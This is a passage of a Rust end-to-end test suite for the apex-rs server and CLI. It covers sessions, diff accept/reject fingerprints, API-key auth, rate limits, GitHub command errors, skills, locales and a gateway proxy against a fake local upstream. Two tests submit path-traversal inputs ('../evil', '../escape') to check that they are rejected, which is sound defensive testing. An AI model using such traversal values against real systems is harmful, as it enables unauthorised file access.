
    let abort: serde_json::Value = post_json(
        &client,
        &base,
        "/api/v1/session/e2e/abort",
        &serde_json::json!({}),
    )
    .await
    .json()
    .await
    .unwrap();
    assert_eq!(abort["aborted"], true, "got: {abort}");

    let del_missing = client
        .delete(format!("{base}/api/v1/sessions/does-not-exist"))
        .send()
        .await
        .unwrap();
    assert_eq!(
        del_missing.status(),
        404,
        "deleting an unknown session 404s"
    );

    let export_missing = get(&client, &base, "/api/v1/export/does-not-exist").await;
    assert_eq!(
        export_missing.status(),
        404,
        "exporting an unknown session 404s"
    );

    let import_err = post_json(&client, &base, "/api/v1/import", &serde_json::json!({})).await;
    assert_eq!(import_err.status(), 400, "import needs file_path or data");

    let unshare_missing = post_json(
        &client,
        &base,
        "/api/v1/unshare/does-not-exist",
        &serde_json::json!({}),
    )
    .await;
    assert_eq!(
        unshare_missing.status(),
        404,
        "unsharing an unknown share 404s"
    );

    // ── Find file ──────────────────────────────────────────
    let no_match: serde_json::Value = get(&client, &base, "/find/file?query=")
        .await
        .json()
        .await
        .unwrap();
    assert!(
        no_match.is_array() && no_match.as_array().unwrap().is_empty(),
        "got: {no_match}"
    );

    let found: serde_json::Value = get(&client, &base, "/find/file?query=main")
        .await
        .json()
        .await
        .unwrap();
    assert!(found.is_array(), "got: {found}");
    let hits = found.as_array().unwrap();
    assert!(
        hits.iter()
            .any(|h| h.as_str().unwrap_or_default().contains("main.py")),
        "expected main.py in: {found}"
    );

    // ── Diff validation (error paths before any git call) ──
    let bad_json = client
        .post(format!("{base}/api/v1/session/e2e/diff/decision"))
        .header("content-type", "application/json")
        .body("{not json")
        .send()
        .await
        .unwrap();
    assert_eq!(bad_json.status(), 400, "malformed JSON body 400s");

    let bad_decision = post_json(
        &client,
        &base,
        "/api/v1/session/e2e/diff/decision",
        &serde_json::json!({"decision": "maybe"}),
    )
    .await;
    assert_eq!(bad_decision.status(), 400, "unknown decision 400s");

    // ── Metrics ────────────────────────────────────────────
    let metrics: serde_json::Value = get(&client, &base, "/metrics").await.json().await.unwrap();
    assert!(metrics["total_tokens"].is_number(), "got: {metrics}");

    // ── SSE global event: first frame announces connection ──
    let sse = client
        .get(format!("{base}/global/event"))
        .send()
        .await
        .unwrap();
    assert_eq!(sse.status(), 200, "SSE endpoint must stream");
    let mut stream = sse.bytes_stream();
    let first = tokio::time::timeout(std::time::Duration::from_secs(5), stream.next())
        .await
        .expect("SSE stream timed out")
        .expect("SSE stream closed before first frame")
        .expect("SSE read error");
    let first = String::from_utf8_lossy(&first);
    assert!(first.contains("connected"), "first SSE frame: {first}");
}

#[tokio::test]
async fn serve_diff_preview_accepts_and_rejects() {
    let sb = Sandbox::new();
    // A committed file whose working-tree copy we will modify.
    git(&sb.cwd, &["init"]);
    // Pin line endings so `git restore --worktree` (reject) writes back the
    // exact committed bytes: Windows' default `core.autocrlf=true` would
    // restore `line1\n` as `line1\r\n`.
    git(&sb.cwd, &["config", "core.autocrlf", "false"]);
    std::fs::write(sb.cwd.join("file.txt"), "line1\n").unwrap();
    git(&sb.cwd, &["add", "file.txt"]);
    git(&sb.cwd, &["commit", "-m", "init"]);

    let port = free_port();
    let _server = ServerGuard::spawn(&sb, &["serve", "--port", &port.to_string()]);
    let base = format!("http://127.0.0.1:{port}");
    let client = reqwest::Client::new();
    assert!(wait_for_health(&client, &base).await, "server not healthy");

    // A clean tree reports `(clean)` with no paths.
    let clean: serde_json::Value = client
        .get(format!("{base}/api/v1/session/s1/diff"))
        .send()
        .await
        .unwrap()
        .json()
        .await
        .unwrap();
    assert_eq!(clean["files"], "(clean)", "got: {clean}");
    assert_eq!(clean["paths"], serde_json::json!([]), "got: {clean}");
    assert_eq!(clean["session_id"], "s1", "got: {clean}");

    // Modify the tracked file → a non-empty working-tree diff.
    std::fs::write(sb.cwd.join("file.txt"), "line1\nline2\n").unwrap();
    let diff: serde_json::Value = client
        .get(format!("{base}/api/v1/session/s1/diff"))
        .send()
        .await
        .unwrap()
        .json()
        .await
        .unwrap();
    assert_eq!(
        diff["paths"],
        serde_json::json!(["file.txt"]),
        "got: {diff}"
    );
    let fingerprint = diff["fingerprint"].as_str().unwrap().to_string();
    assert_eq!(fingerprint.len(), 64, "fingerprint must be a sha256 hex");
    assert!(
        diff["diff"].as_str().unwrap().contains("line2"),
        "got: {diff}"
    );

    // Validation chain: invalid JSON, non-object body, bad decision,
    // non-list files, invalid path, path outside the current diff.
    let bad_json = client
        .post(format!("{base}/api/v1/session/s1/diff/decision"))
        .body("not json")
        .send()
        .await
        .unwrap();
    assert_eq!(bad_json.status(), 400);
    assert_eq!(
        bad_json.json::<serde_json::Value>().await.unwrap()["error"],
        "invalid JSON body"
    );

    let not_object = client
        .post(format!("{base}/api/v1/session/s1/diff/decision"))
        .body("[1, 2]")
        .send()
        .await
        .unwrap();
    assert_eq!(not_object.status(), 400);

    let bad_decision = client
        .post(format!("{base}/api/v1/session/s1/diff/decision"))
        .json(&serde_json::json!({"decision": "maybe"}))
        .send()
        .await
        .unwrap();
    assert_eq!(bad_decision.status(), 400);
    assert_eq!(
        bad_decision.json::<serde_json::Value>().await.unwrap()["error"],
        "decision must be 'accept' or 'reject'"
    );

    let not_list = client
        .post(format!("{base}/api/v1/session/s1/diff/decision"))
        .json(&serde_json::json!({"decision": "accept", "files": "file.txt"}))
        .send()
        .await
        .unwrap();
    assert_eq!(not_list.status(), 400);
    assert_eq!(
        not_list.json::<serde_json::Value>().await.unwrap()["error"],
        "files must be a list"
    );

    let bad_path = client
        .post(format!("{base}/api/v1/session/s1/diff/decision"))
        .json(&serde_json::json!({"decision": "accept", "files": ["../evil"]}))
        .send()
        .await
        .unwrap();
    assert_eq!(bad_path.status(), 400);
    assert_eq!(
        bad_path.json::<serde_json::Value>().await.unwrap()["error"],
        "invalid path: '../evil'"
    );

    let not_in_diff = client
        .post(format!("{base}/api/v1/session/s1/diff/decision"))
        .json(&serde_json::json!({"decision": "accept", "files": ["other.txt"]}))
        .send()
        .await
        .unwrap();
    assert_eq!(not_in_diff.status(), 400);
    assert_eq!(
        not_in_diff.json::<serde_json::Value>().await.unwrap()["error"],
        "path not in current diff: other.txt"
    );

    // Accept with `files: null` → all current paths are accepted.
    let accepted: serde_json::Value = client
        .post(format!("{base}/api/v1/session/s1/diff/decision"))
        .json(&serde_json::json!({"decision": "accept"}))
        .send()
        .await
        .unwrap()
        .json()
        .await
        .unwrap();
    assert_eq!(accepted["status"], "accepted", "got: {accepted}");
    assert_eq!(
        accepted["files"],
        serde_json::json!(["file.txt"]),
        "got: {accepted}"
    );
    assert_eq!(accepted["fingerprint"], fingerprint, "got: {accepted}");

    // Modify again → the fingerprint moves.
    std::fs::write(sb.cwd.join("file.txt"), "line1\nline2\nline3\n").unwrap();
    let diff2: serde_json::Value = client
        .get(format!("{base}/api/v1/session/s1/diff"))
        .send()
        .await
        .unwrap()
        .json()
        .await
        .unwrap();
    let fingerprint2 = diff2["fingerprint"].as_str().unwrap().to_string();
    assert_ne!(
        fingerprint2, fingerprint,
        "fingerprint must change with the diff"
    );

    // Rejecting with a stale fingerprint is a 409 `diff_changed`.
    let conflict = client
        .post(format!("{base}/api/v1/session/s1/diff/decision"))
        .json(&serde_json::json!({
            "decision": "reject",
            "fingerprint": fingerprint,
            "files": ["file.txt"],
        }))
        .send()
        .await
        .unwrap();
    assert_eq!(conflict.status(), 409);
    let conflict_body: serde_json::Value = conflict.json().await.unwrap();
    assert_eq!(
        conflict_body["error"], "diff_changed",
        "got: {conflict_body}"
    );
    assert_eq!(
        conflict_body["fingerprint"], fingerprint2,
        "got: {conflict_body}"
    );

    // Reject with the current fingerprint reverts the working-tree change.
    let rejected: serde_json::Value = client
        .post(format!("{base}/api/v1/session/s1/diff/decision"))
        .json(&serde_json::json!({
            "decision": "reject",
            "fingerprint": fingerprint2,
            "files": ["file.txt"],
        }))
        .send()
        .await
        .unwrap()
        .json()
        .await
        .unwrap();
    assert_eq!(rejected["status"], "rejected", "got: {rejected}");
    assert_eq!(
        rejected["reverted"],
        serde_json::json!(["file.txt"]),
        "got: {rejected}"
    );
    assert_eq!(rejected["failed"], serde_json::json!([]), "got: {rejected}");
    assert_eq!(
        std::fs::read_to_string(sb.cwd.join("file.txt")).unwrap(),
        "line1\n",
        "reject must restore the committed content"
    );

    // The tree is clean again.
    let after: serde_json::Value = client
        .get(format!("{base}/api/v1/session/s1/diff"))
        .send()
        .await
        .unwrap()
        .json()
        .await
        .unwrap();
    assert_eq!(after["files"], "(clean)", "got: {after}");
}

#[tokio::test]
async fn serve_http_auth_and_rate_limit_are_hermetic() {
    let sb = Sandbox::new();
    let client = reqwest::Client::new();
    let (key_id, key) = create_key(&sb, "e2e");

    // Only the sha256 hash is persisted.
    let store = sb.apex_path().join("api_keys.json");
    let stored = std::fs::read_to_string(&store).unwrap();
    assert!(!stored.contains(&key), "plaintext key must not be stored");
    assert!(stored.contains(&key_id), "key id must be stored");
    let keys_file = store.to_str().unwrap().to_string();

    let protected = |base: &str| format!("{base}/api/v1/context/repo-map");

    // ── Server 1: auth on, generous rate limit ──────────────────────────
    let port = free_port();
    let server = ServerGuard::spawn_with(
        &sb,
        &["serve", "--port", &port.to_string()],
        &[
            ("APEX_REQUIRE_AUTH", "1"),
            ("APEX_API_KEYS_FILE", keys_file.as_str()),
            ("APEX_RATE_LIMIT_PER_MINUTE", "1000"),
        ],
    );
    let base = format!("http://127.0.0.1:{port}");
    assert!(
        wait_for_health(&client, &base).await,
        "apex-rs serve (auth) did not become healthy"
    );

    // Every protected route demands the exact Python 401 body.
    let denied = client.get(protected(&base)).send().await.unwrap();
    assert_eq!(denied.status(), 401);
    let body: serde_json::Value = denied.json().await.unwrap();
    assert_eq!(body["error"], "Authentication required");
    assert_eq!(body["code"], "AUTH_REQUIRED");

    // Unknown keys are rejected the same way.
    assert_eq!(
        client
            .get(protected(&base))
            .header("X-API-Key", "apex_unknown")
            .send()
            .await
            .unwrap()
            .status(),
        401
    );

    // The three Python carriers all authenticate.
    for request in [
        client
            .get(protected(&base))
            .header("Authorization", format!("Bearer {key}")),
        client.get(format!("{}?api_key={key}", protected(&base))),
        client.get(protected(&base)).header("X-API-Key", &key),
    ] {
        assert_eq!(request.send().await.unwrap().status(), 200);
    }

    // An empty Bearer does not fall back to the query parameter (Python
    // parity); it is unit-tested because HTTP stacks trim trailing spaces.

    // Unmatched routes stay 404s; they never leak the auth challenge.
    assert_eq!(
        client
            .get(format!("{base}/nope"))
            .send()
            .await
            .unwrap()
            .status(),
        404
    );

    // Auth handlers are protected too.
    let login_body = serde_json::json!({"provider": "anthropic", "api_key": "sk-test"});
    assert_eq!(
        client
            .post(format!("{base}/api/v1/auth/login"))
            .json(&login_body)
            .send()
            .await
            .unwrap()
            .status(),
        401
    );

    // Deterministic status: every provider env var is stripped for the child.
    let status: serde_json::Value = client
        .get(format!("{base}/api/v1/auth/status"))
        .header("X-API-Key", &key)
        .send()
        .await
        .unwrap()
        .json()
        .await
        .unwrap();
    assert_eq!(status["providers"].as_array().unwrap().len(), 19);
    assert_eq!(status["configured_count"], 0);
    assert_eq!(status["any_configured"], false);
    assert!(status["providers"]
        .as_array()
        .unwrap()
        .iter()
        .any(|provider| provider["env_var"] == "ANTHROPIC_API_KEY"
            && provider["configured"] == false));

    // Login: lowercase input, env var mapping, then status reflects it.
    let login: serde_json::Value = client
        .post(format!("{base}/api/v1/auth/login"))
        .header("X-API-Key", &key)
        .json(&login_body)
        .send()
        .await
        .unwrap()
        .json()
        .await
        .unwrap();
    assert_eq!(login["configured"], true);
    assert_eq!(login["provider"], "ANTHROPIC");
    assert_eq!(login["env_var"], "ANTHROPIC_API_KEY");

    let status: serde_json::Value = client
        .get(format!("{base}/api/v1/auth/status"))
        .header("X-API-Key", &key)
        .send()
        .await
        .unwrap()
        .json()
        .await
        .unwrap();
    assert_eq!(status["configured_count"], 1);
    assert_eq!(status["any_configured"], true);

    // Provider names are uppercased and spaces become underscores.
    let unknown = client
        .post(format!("{base}/api/v1/auth/login"))
        .header("X-API-Key", &key)
        .json(&serde_json::json!({"provider": "open ai", "api_key": "x"}))
        .send()
        .await
        .unwrap();
    assert_eq!(unknown.status(), 400);
    let body: serde_json::Value = unknown.json().await.unwrap();
    assert_eq!(body["error"], "Unknown provider: OPEN_AI");

    let missing = client
        .post(format!("{base}/api/v1/auth/login"))
        .header("X-API-Key", &key)
        .json(&serde_json::json!({"provider": "anthropic", "api_key": ""}))
        .send()
        .await
        .unwrap();
    assert_eq!(missing.status(), 400);
    let body: serde_json::Value = missing.json().await.unwrap();
    assert_eq!(body["error"], "provider and api_key required");

    // Logout removes one provider, including the HF special case.
    let logout: serde_json::Value = client
        .post(format!("{base}/api/v1/auth/logout"))
        .header("X-API-Key", &key)
        .json(&serde_json::json!({"provider": "Anthropic"}))
        .send()
        .await
        .unwrap()
        .json()
        .await
        .unwrap();
    assert_eq!(logout["removed"], true);
    assert_eq!(logout["env_var"], "ANTHROPIC_API_KEY");

    let hf: serde_json::Value = client
        .post(format!("{base}/api/v1/auth/login"))
        .header("X-API-Key", &key)
        .json(&serde_json::json!({"provider": "hf", "api_key": "hf_test"}))
        .send()
        .await
        .unwrap()
        .json()
        .await
        .unwrap();
    assert_eq!(hf["env_var"], "HF_TOKEN");

    // Provider-less logout clears every known key (empty body is allowed).
    let logout_all: serde_json::Value = client
        .post(format!("{base}/api/v1/auth/logout"))
        .header("X-API-Key", &key)
        .send()
        .await
        .unwrap()
        .json()
        .await
        .unwrap();
    assert_eq!(logout_all["removed"], true);
    assert!(logout_all["env_vars"]
        .as_array()
        .unwrap()
        .iter()
        .any(|name| name == "HF_TOKEN"));

    // A CLI revoke is visible to the running server immediately: the store is
    // re-read per request (no cache).
    let revoked = sb.run(&["key", "revoke", &key_id]);
    assert_success(&revoked, "key revoke");
    assert!(stdout(&revoked).contains(&format!("Revoked key {key_id}")));
    assert_eq!(
        client
            .get(protected(&base))
            .header("X-API-Key", &key)
            .send()
            .await
            .unwrap()
            .status(),
        401
    );

    drop(server);

    // ── Server 2: auth on, two requests per minute ──────────────────────
    let (rate_id, rate_key) = create_key(&sb, "rate");
    let port = free_port();
    let server = ServerGuard::spawn_with(
        &sb,
        &["serve", "--port", &port.to_string()],
        &[
            ("APEX_REQUIRE_AUTH", "1"),
            ("APEX_API_KEYS_FILE", keys_file.as_str()),
            ("APEX_RATE_LIMIT_PER_MINUTE", "2"),
            ("APEX_RATE_LIMIT_PER_HOUR", "1000"),
            ("APEX_RATE_LIMIT_PER_DAY", "10000"),
        ],
    );
    let base = format!("http://127.0.0.1:{port}");
    assert!(
        wait_for_health(&client, &base).await,
        "apex-rs serve (rate limit) did not become healthy"
    );

    // Rejected requests never consume the key's budget: auth wraps the
    // limiter, like Python's `_check_auth` running before `_check_rate_limit`.
    for _ in 0..5 {
        assert_eq!(
            client.get(protected(&base)).send().await.unwrap().status(),
            401
        );
    }
    for _ in 0..2 {
        assert_eq!(
            client
                .get(protected(&base))
                .header("X-API-Key", &rate_key)
                .send()
                .await
                .unwrap()
                .status(),
            200
        );
    }
    let limited = client
        .get(protected(&base))
        .header("Authorization", format!("Bearer {rate_key}"))
        .send()
        .await
        .unwrap();
    assert_eq!(limited.status(), 429);
    assert!(limited.headers().get("retry-after").is_some());
    let body: serde_json::Value = limited.json().await.unwrap();
    assert_eq!(body["error"], "Rate limit exceeded");
    assert_eq!(body["code"], "RATE_LIMITED");

    // `/health` stays probeable once the budget is exhausted.
    assert_eq!(
        client
            .get(format!("{base}/health"))
            .send()
            .await
            .unwrap()
            .status(),
        200
    );

    drop(server);

    // The CLI sees the counters the servers recorded; revoked keys stay listed.
    let list = sb.run(&["key", "list"]);
    assert_success(&list, "key list");
    let text = stdout(&list);
    assert!(
        text.contains(&format!("{key_id} - e2e [revoked] requests=")),
        "got:\n{text}"
    );
    assert!(
        text.contains(&format!("{rate_id} - rate [active] requests=3")),
        "got:\n{text}"
    );
}

#[test]
fn github_cli_install_run_and_error_paths() {
    let sb = Sandbox::new();

    // install: Python parity, exactly the three info lines.
    let install = sb.run(&["github", "install"]);
    assert_success(&install, "github install");
    assert_eq!(
        stdout(&install).trim(),
        "Installing GitHub agent...\n\
         This sets up APEX as a GitHub Actions workflow.\n\
         See: https://github.com/Ggboykxz/APEX"
    );

    // No subcommand: the usage fallback, exit 0.
    let usage = sb.run(&["github"]);
    assert_success(&usage, "github usage");
    let text = stdout(&usage);
    assert!(text.contains("Usage: apex-rs github"), "got: {text}");
    assert!(
        text.contains("install") && text.contains("run"),
        "got: {text}"
    );

    // Every network path points at a dead local port: no network, deterministic.
    fn dead(sb: &Sandbox, args: &[&str]) -> Output {
        sb.base_command()
            .env("APEX_GITHUB_API", "http://127.0.0.1:9")
            .args(args)
            .output()
            .expect("run apex-rs")
    }

    let run = dead(&sb, &["github", "run"]);
    assert_success(&run, "github run");
    let text = stdout(&run);
    assert!(text.contains("Running GitHub agent..."), "got: {text}");
    assert!(text.contains("Found 0 issues and 0 PRs"), "got: {text}");

    let issue = dead(&sb, &["github", "issue", "3"]);
    assert!(!issue.status.success(), "unreachable API must fail");
    assert!(
        stderr(&issue).contains("ERROR: Issue 3 not found"),
        "got: {}",
        stderr(&issue)
    );

    let close = dead(&sb, &["github", "issue-close", "3"]);
    assert!(!close.status.success());
    assert!(stderr(&close).contains("ERROR: Failed to close issue 3"));

    let pr = dead(&sb, &["github", "pr", "3"]);
    assert!(!pr.status.success());
    assert!(stderr(&pr).contains("ERROR: Pull request 3 not found"));

    let merge = dead(&sb, &["github", "pr-merge", "3"]);
    assert!(!merge.status.success());
    assert!(stderr(&merge).contains("ERROR: Failed to merge PR 3"));

    let todos = dead(&sb, &["github", "automate", "todos"]);
    assert_success(&todos, "github automate todos");
    let text = stdout(&todos);
    assert!(text.contains("Todo issues:"), "got: {text}");
    assert!(text.contains("No issues found"), "got: {text}");

    let list = dead(&sb, &["github", "automate", "list", "--label", "bug"]);
    assert_success(&list, "github automate list");
    let text = stdout(&list);
    assert!(text.contains("Open issues for label 'bug':"), "got: {text}");
    assert!(text.contains("No issues found"), "got: {text}");

    let closed = dead(&sb, &["github", "automate", "close-completed"]);
    assert_success(&closed, "github automate close-completed");
    assert_eq!(stdout(&closed).trim(), "0 merged PR(s)");

    // The write flows require a detectable repository.
    let create = dead(
        &sb,
        &[
            "github",
            "automate",
            "create-pr",
            "--title",
            "t",
            "--branch",
            "b",
        ],
    );
    assert!(!create.status.success());
    assert!(
        stderr(&create).contains("ERROR: No GitHub repository detected"),
        "got: {}",
        stderr(&create)
    );
}

#[test]
fn skill_lifecycle_is_hermetic() {
    let sb = Sandbox::new();

    let bad = sb.run(&["skill", "add", "../escape", "d", "p"]);
    assert!(
        !bad.status.success(),
        "path-traversal name must be rejected"
    );
    assert!(stderr(&bad).contains("ERROR: Invalid skill name"));

    let add = sb.run(&[
        "skill",
        "add",
        "e2e-skill",
        "A demo skill",
        "Say hello to {name}",
    ]);
    assert_success(&add, "skill add");
    assert!(
        stdout(&add).starts_with("Added skill: e2e-skill"),
        "got: {}",
        stdout(&add)
    );
    let file = sb.cwd.join(".apex").join("skills").join("e2e-skill.md");
    assert!(file.exists(), "skill must persist under the project dir");

    // A fresh process (new SkillManager) must load the written file.
    let list = sb.run(&["skill", "list"]);
    assert_success(&list, "skill list");
    assert!(
        stdout(&list).contains("e2e-skill: A demo skill"),
        "got: {}",
        stdout(&list)
    );

    let remove = sb.run(&["skill", "remove", "e2e-skill"]);
    assert_success(&remove, "skill remove");
    assert!(stdout(&remove).contains("Removed skill: e2e-skill"));
    assert!(!file.exists(), "skill file must be deleted");

    let empty = sb.run(&["skill", "list"]);
    assert_success(&empty, "skill list after remove");
    assert!(
        stdout(&empty).contains("No skills found"),
        "got: {}",
        stdout(&empty)
    );

    let missing = sb.run(&["skill", "remove", "e2e-skill"]);
    assert!(!missing.status.success(), "second remove must fail");
    assert!(stderr(&missing).contains("ERROR: Skill not found: e2e-skill"));
}

#[test]
fn crate_root_has_no_global_dead_code_allow() {
    let main_rs = include_str!("../src/main.rs");
    assert!(
        !main_rs.contains("#![allow(dead_code)]"),
        "src/main.rs must not re-introduce the crate-level dead-code allow; \
         use a justified, item-scoped attribute instead"
    );
}

#[test]
fn cli_locale_command_works() {
    let sb = Sandbox::new();

    // Default (no --lang): shows the active locale and available locales.
    let out = sb.run(&["locale"]);
    assert_success(&out, "locale");
    let text = stdout(&out);
    assert!(text.contains("Current locale:"), "got: {text}");
    assert!(
        text.contains("Available locales: en, ja, zh-Hans, pt-BR"),
        "got: {text}"
    );

    // Switching to Japanese selects the locale and localizes the welcome.
    let ja = sb.run(&["locale", "--lang", "ja"]);
    assert_success(&ja, "locale --lang ja");
    let ja_text = stdout(&ja);
    assert!(ja_text.contains("Current locale: ja"), "got: {ja_text}");
    assert!(
        ja_text.contains("APEXへようこそ"),
        "expected the Japanese welcome string, got: {ja_text}"
    );

    // Switching back to English.
    let en = sb.run(&["locale", "--lang", "en"]);
    assert_success(&en, "locale --lang en");
    let en_text = stdout(&en);
    assert!(en_text.contains("Current locale: en"), "got: {en_text}");
    assert!(
        en_text.contains("Welcome to APEX"),
        "expected the English welcome string, got: {en_text}"
    );
}

#[tokio::test]
async fn serve_exposes_telemetry_route() {
    let sb = Sandbox::new();

    // Grab a free port, then let the server child bind it.
    let listener = std::net::TcpListener::bind("127.0.0.1:0").unwrap();
    let port = listener.local_addr().unwrap().port();
    drop(listener);

    let _server = ServerGuard::spawn(&sb, &["serve", "--port", &port.to_string()]);
    let base = format!("http://127.0.0.1:{port}");
    let client = reqwest::Client::new();

    let healthy = wait_for_health(&client, &base).await;
    assert!(healthy, "apex-rs serve did not become healthy");

    let tele: serde_json::Value = get(&client, &base, "/api/v1/telemetry")
        .await
        .json()
        .await
        .unwrap();
    // Session start is recorded at service bootstrap.
    let stats = tele["telemetry"]
        .as_object()
        .expect("telemetry must be an object");
    assert!(stats.contains_key("session_id"), "got: {tele}");
    assert!(stats.contains_key("total_events"), "got: {tele}");
    assert!(tele["performance"].is_object(), "got: {tele}");
}

/// Index of the first occurrence of `needle` in `haystack` (fake upstreams).
fn find_bytes(haystack: &[u8], needle: &[u8]) -> Option<usize> {
    if needle.len() > haystack.len() {
        return None;
    }
    haystack.windows(needle.len()).position(|w| w == needle)
}

/// Full gateway lifecycle against a fake OpenRouter upstream: CLI key
/// generation and status, the 8 HTTP routes (auth, 403 model gate,
/// register, payload cap, proxy, usage injection, admin trio), and a
/// revoke visible to both the server and the CLI.
#[tokio::test]
async fn gateway_proxy_lifecycle_is_hermetic() {
    let sb = Sandbox::new();

    // ── CLI: key generation + status against the temp `~/.apex` ──
    let out = sb.run(&["gateway", "key", "free", "e2e-label"]);
    assert_success(&out, "gateway key");
    let text = stdout(&out);
    assert!(
        text.contains("Gateway API key generated (free):"),
        "unexpected output:\n{text}"
    );
    let key = text.lines().nth(1).unwrap_or_default().trim().to_string();
    assert!(key.starts_with("apex_"), "missing gateway key:\n{text}");

    let listed = sb.run(&["gateway", "status"]);
    assert_success(&listed, "gateway status");
    let status_text = stdout(&listed);
    assert!(
        status_text.contains("Gateway keys (1):")
            && status_text.contains("[free]")
            && status_text.contains("e2e-label")
            && status_text.contains("(active)"),
        "got:\n{status_text}"
    );

    // ── Fake OpenRouter upstream: one request, fixed OpenAI-shaped body ──
    let upstream_port = free_port();
    let upstream = std::thread::spawn(move || {
        use std::io::{Read, Write};
        let listener = std::net::TcpListener::bind(format!("127.0.0.1:{upstream_port}")).unwrap();
        let (mut stream, _) = listener.accept().unwrap();
        let mut data: Vec<u8> = Vec::new();
        let mut buf = [0u8; 8192];
        let mut body_range: Option<(usize, usize)> = None;
        loop {
            let n = stream.read(&mut buf).unwrap();
            assert!(n > 0, "upstream connection closed mid-request");
            data.extend_from_slice(&buf[..n]);
            if body_range.is_none() {
                if let Some(pos) = find_bytes(&data, b"\r\n\r\n") {
                    let headers = String::from_utf8_lossy(&data[..pos]).to_lowercase();
                    let body_len = headers
                        .lines()
                        .find_map(|l| l.strip_prefix("content-length:"))
                        .and_then(|v| v.trim().parse::<usize>().ok())
                        .unwrap_or(0);
                    body_range = Some((pos + 4, pos + 4 + body_len));
                }
            }
            if let Some((start, end)) = body_range {
                if data.len() >= end {
                    let body_preview = String::from_utf8_lossy(&data[start..end]).to_string();
                    assert!(
                        body_preview.contains("free-or-qwen3-coder"),
                        "body: {body_preview}"
                    );
                    let resp = r#"{"id":"chatcmpl-e2e","object":"chat.completion","model":"free-or-qwen3-coder","choices":[{"index":0,"message":{"role":"assistant","content":"ok"},"finish_reason":"stop"}],"usage":{"prompt_tokens":11,"completion_tokens":7,"total_tokens":18}}"#;
                    let out = format!(
                        "HTTP/1.1 200 OK\r\nContent-Type: application/json\r\nContent-Length: {}\r\nConnection: close\r\n\r\n{resp}",
                        resp.len()
                    );
                    stream.write_all(out.as_bytes()).unwrap();
                    return;
                }
            }
        }
    });

    // ── Gateway server pointed at the fake upstream ──
    let port = free_port();
    let port_s = port.to_string();
    let upstream_base = format!("http://127.0.0.1:{upstream_port}");
    let _gw = ServerGuard::spawn_with(
        &sb,
        &["gateway", "start"],
        &[
            ("APEX_GATEWAY_PORT", &port_s),
            ("APEX_GATEWAY_KEY", "test-upstream-key"),
            ("APEX_GATEWAY_ADMIN_KEY", "admin-test"),
            ("APEX_GATEWAY_UPSTREAM_BASE", &upstream_base),
        ],
    );
    let base = format!("http://127.0.0.1:{port}");
    let client = reqwest::Client::new();

    // `wait_for_health` targets `/health`; the gateway answers on `/v1/health`.
    let mut up = false;
    for _ in 0..600 {
        if client
            .get(format!("{base}/v1/health"))
            .send()
            .await
            .map(|r| r.status().is_success())
            .unwrap_or(false)
        {
            up = true;
            break;
        }
        tokio::time::sleep(std::time::Duration::from_millis(100)).await;
    }
    assert!(up, "apex-rs gateway start did not become healthy");

    // Health + models.
    let health: serde_json::Value = get(&client, &base, "/v1/health")
        .await
        .json()
        .await
        .unwrap();
    assert_eq!(
        health,
        serde_json::json!({ "status": "ok", "service": "apex-gateway" })
    );

    let models: serde_json::Value = get(&client, &base, "/v1/models")
        .await
        .json()
        .await
        .unwrap();
    let list = models["models"].as_array().expect("models must be a list");
    assert!(!list.is_empty(), "free-/pro- aliases are missing");
    for (i, m) in list.iter().enumerate() {
        let id = m["id"].as_str().unwrap_or("");
        assert!(
            id.starts_with("free-") || id.starts_with("pro-"),
            "unexpected model {id}"
        );
        assert!(m["provider"].is_string(), "missing provider: {m}");
        if i > 0 {
            assert!(
                list[i - 1]["id"].as_str().unwrap_or("") <= id,
                "models must be sorted by id"
            );
        }
    }

    // Register: success, invalid tier, oversized payload.
    let reg = post_json(
        &client,
        &base,
        "/v1/register",
        &serde_json::json!({ "tier": "pro", "label": "registered" }),
    )
    .await;
    assert_eq!(reg.status(), 200);
    let reg_body: serde_json::Value = reg.json().await.unwrap();
    assert!(reg_body["api_key"]
        .as_str()
        .unwrap_or("")
        .starts_with("apex_"));
    assert_eq!(reg_body["tier"], "pro");
    assert_eq!(reg_body["label"], "registered");
    assert_eq!(reg_body["limits"]["daily_requests"], 500);
    assert_eq!(reg_body["limits"]["rate_per_minute"], 60);
    assert_eq!(reg_body["limits"]["max_concurrent"], 3);

    let bad_tier = post_json(
        &client,
        &base,
        "/v1/register",
        &serde_json::json!({ "tier": "bogus" }),
    )
    .await;
    assert_eq!(bad_tier.status(), 400);
    assert_eq!(
        bad_tier.json::<serde_json::Value>().await.unwrap(),
        serde_json::json!({ "error": "Invalid tier: bogus" })
    );

    let big = post_json(
        &client,
        &base,
        "/v1/register",
        &serde_json::json!({ "label": "x".repeat(5000) }),
    )
    .await;
    assert_eq!(big.status(), 413);
    assert_eq!(
        big.json::<serde_json::Value>().await.unwrap(),
        serde_json::json!({ "error": "Payload too large" })
    );

    // Chat: missing auth, unknown key, model not in tier, then the proxy.
    let chat_body = serde_json::json!({ "model": "free-or-qwen3-coder", "messages": [] });
    let anon = client
        .post(format!("{base}/v1/chat/completions"))
        .json(&chat_body)
        .send()
        .await
        .unwrap();
    assert_eq!(anon.status(), 401);
    assert_eq!(
        anon.json::<serde_json::Value>().await.unwrap(),
        serde_json::json!({ "error": "Missing or invalid Authorization header" })
    );

    let bad_key = client
        .post(format!("{base}/v1/chat/completions"))
        .bearer_auth("apex_bogus")
        .json(&chat_body)
        .send()
        .await
        .unwrap();
    assert_eq!(bad_key.status(), 401);
    assert_eq!(
        bad_key.json::<serde_json::Value>().await.unwrap(),
        serde_json::json!({ "error": "Invalid or revoked API key" })
    );

    let forbidden = client
        .post(format!("{base}/v1/chat/completions"))
        .bearer_auth(&key)
        .json(&serde_json::json!({ "model": "pro-glm-5", "messages": [] }))
        .send()
        .await
        .unwrap();
    assert_eq!(forbidden.status(), 403);
    assert_eq!(
        forbidden.json::<serde_json::Value>().await.unwrap(),
        serde_json::json!({ "error": "Model 'pro-glm-5' not available in 'free' tier" })
    );

    // The 200 path consumes the fake upstream's single request.
    let ok = client
        .post(format!("{base}/v1/chat/completions"))
        .bearer_auth(&key)
        .json(&chat_body)
        .send()
        .await
        .unwrap();
    assert_eq!(ok.status(), 200, "chat must proxy to the upstream");
    let ok_body: serde_json::Value = ok.json().await.unwrap();
    assert_eq!(ok_body["choices"][0]["message"]["content"], "ok");
    assert_eq!(ok_body["usage"]["prompt_tokens"], 11);
    assert_eq!(ok_body["usage"]["completion_tokens"], 7);
    assert_eq!(ok_body["usage"]["apex_gateway"]["tier"], "free");
    assert_eq!(ok_body["usage"]["apex_gateway"]["requests_today"], 1);

    // Status: unauthenticated, then the free key's counters.
    let no_auth = get(&client, &base, "/v1/status").await;
    assert_eq!(no_auth.status(), 401);
    assert_eq!(
